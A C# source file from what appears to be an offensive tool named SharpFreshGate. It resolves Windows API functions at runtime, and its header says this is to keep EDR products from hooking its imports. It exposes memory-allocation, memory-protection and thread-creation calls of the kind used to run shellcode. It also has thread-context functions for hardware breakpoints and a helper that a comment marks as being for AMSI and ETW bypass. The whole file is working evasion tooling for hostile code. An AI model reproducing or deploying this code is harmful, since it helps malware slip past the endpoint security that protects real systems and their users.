/**
 * DynamicInvoke.cs - Native dynamic API resolution without external dependencies
 * 
 * This module provides dynamic resolution of Windows API functions to avoid
 * static imports that could be hooked by EDR solutions.
 */

using System;
using System.Runtime.InteropServices;

namespace SharpFreshGate.Core
{
    public static class DynamicInvoke
    {
        // Minimal P/Invoke - only what's needed for bootstrapping
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        // ============== Delegate Definitions ==============

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr DVirtualAlloc(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flAllocationType,
            uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool DVirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool DVirtualFree(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint dwFreeType);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr DCreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out uint lpThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint DWaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool DCloseHandle(IntPtr hObject);

        // EnumWindows callback delegate
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool DEnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

        // Thread context for hardware breakpoints
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr DGetCurrentThread();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool DGetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool DSetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr DOpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint DGetCurrentThreadId();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint DSuspendThread(IntPtr hThread);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint DResumeThread(IntPtr hThread);

        // ============== Cached Delegates ==============

        private static DVirtualAlloc _virtualAlloc;
        private static DVirtualProtect _virtualProtect;
        private static DVirtualFree _virtualFree;
        private static DCreateThread _createThread;
        private static DWaitForSingleObject _waitForSingleObject;
        private static DCloseHandle _closeHandle;
        private static DEnumWindows _enumWindows;
        private static DGetCurrentThread _getCurrentThread;
        private static DGetThreadContext _getThreadContext;
        private static DSetThreadContext _setThreadContext;
        private static DOpenThread _openThread;
        private static DGetCurrentThreadId _getCurrentThreadId;
        private static DSuspendThread _suspendThread;
        private static DResumeThread _resumeThread;

        // ============== Dynamic Resolution ==============

        private static T GetDelegate<T>(string moduleName, string functionName) where T : Delegate
        {
            IntPtr hModule = GetModuleHandle(moduleName);
            if (hModule == IntPtr.Zero)
            {
                hModule = LoadLibrary(moduleName);
                if (hModule == IntPtr.Zero)
                {
                    throw new Exception($"Failed to load module: {moduleName}");
                }
            }

            IntPtr procAddress = GetProcAddress(hModule, functionName);
            if (procAddress == IntPtr.Zero)
            {
                throw new Exception($"Failed to get address for: {functionName}");
            }

            return Marshal.GetDelegateForFunctionPointer<T>(procAddress);
        }

        // ============== Public API ==============

        public static DVirtualAlloc VirtualAlloc
        {
            get
            {
                if (_virtualAlloc == null)
                    _virtualAlloc = GetDelegate<DVirtualAlloc>("kernel32.dll", "VirtualAlloc");
                return _virtualAlloc;
            }
        }

        public static DVirtualProtect VirtualProtect
        {
            get
            {
                if (_virtualProtect == null)
                    _virtualProtect = GetDelegate<DVirtualProtect>("kernel32.dll", "VirtualProtect");
                return _virtualProtect;
            }
        }

        public static DVirtualFree VirtualFree
        {
            get
            {
                if (_virtualFree == null)
                    _virtualFree = GetDelegate<DVirtualFree>("kernel32.dll", "VirtualFree");
                return _virtualFree;
            }
        }

        public static DCreateThread CreateThread
        {
            get
            {
                if (_createThread == null)
                    _createThread = GetDelegate<DCreateThread>("kernel32.dll", "CreateThread");
                return _createThread;
            }
        }

        public static DWaitForSingleObject WaitForSingleObject
        {
            get
            {
                if (_waitForSingleObject == null)
                    _waitForSingleObject = GetDelegate<DWaitForSingleObject>("kernel32.dll", "WaitForSingleObject");
                return _waitForSingleObject;
            }
        }

        public static DCloseHandle CloseHandle
        {
            get
            {
                if (_closeHandle == null)
                    _closeHandle = GetDelegate<DCloseHandle>("kernel32.dll", "CloseHandle");
                return _closeHandle;
            }
        }

        public static DEnumWindows EnumWindows
        {
            get
            {
                if (_enumWindows == null)
                    _enumWindows = GetDelegate<DEnumWindows>("user32.dll", "EnumWindows");
                return _enumWindows;
            }
        }

        public static DGetCurrentThread GetCurrentThread
        {
            get
            {
                if (_getCurrentThread == null)
                    _getCurrentThread = GetDelegate<DGetCurrentThread>("kernel32.dll", "GetCurrentThread");
                return _getCurrentThread;
            }
        }

        public static DGetThreadContext GetThreadContext
        {
            get
            {
                if (_getThreadContext == null)
                    _getThreadContext = GetDelegate<DGetThreadContext>("kernel32.dll", "GetThreadContext");
                return _getThreadContext;
            }
        }

        public static DSetThreadContext SetThreadContext
        {
            get
            {
                if (_setThreadContext == null)
                    _setThreadContext = GetDelegate<DSetThreadContext>("kernel32.dll", "SetThreadContext");
                return _setThreadContext;
            }
        }

        public static DOpenThread OpenThread
        {
            get
            {
                if (_openThread == null)
                    _openThread = GetDelegate<DOpenThread>("kernel32.dll", "OpenThread");
                return _openThread;
            }
        }

        public static DGetCurrentThreadId GetCurrentThreadId
        {
            get
            {
                if (_getCurrentThreadId == null)
                    _getCurrentThreadId = GetDelegate<DGetCurrentThreadId>("kernel32.dll", "GetCurrentThreadId");
                return _getCurrentThreadId;
            }
        }

        public static DSuspendThread SuspendThread
        {
            get
            {
                if (_suspendThread == null)
                    _suspendThread = GetDelegate<DSuspendThread>("kernel32.dll", "SuspendThread");
                return _suspendThread;
            }
        }

        public static DResumeThread ResumeThread
        {
            get
            {
                if (_resumeThread == null)
                    _resumeThread = GetDelegate<DResumeThread>("kernel32.dll", "ResumeThread");
                return _resumeThread;
            }
        }

        // ============== Utility: Get function address for AMSI/ETW bypass ==============

        public static IntPtr GetFunctionAddress(string moduleName, string functionName)
        {
            IntPtr hModule = GetModuleHandle(moduleName);
            if (hModule == IntPtr.Zero)
            {
                hModule = LoadLibrary(moduleName);
            }
            if (hModule == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }
            return GetProcAddress(hModule, functionName);
        }
    }
}
